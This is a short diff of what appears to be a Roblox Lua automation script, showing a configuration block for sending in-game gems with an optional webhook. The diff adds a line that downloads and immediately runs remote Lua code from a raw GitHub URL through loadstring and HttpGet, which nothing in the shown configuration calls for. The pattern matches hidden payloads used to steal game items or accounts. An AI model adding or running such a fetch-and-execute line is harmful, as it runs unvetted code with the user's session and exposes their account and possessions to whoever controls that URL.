@@ -17,7 +17,8 @@ if not getgenv().Config then
 		SendGemWebhook = "" -- put yout webhook link in here, will notify you when the gem is sent, if there is no webhook, just leave it blank
 	}
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/duongcuteleu/main/main/Checkhuge"))()
+task.wait(5)
 
 
 
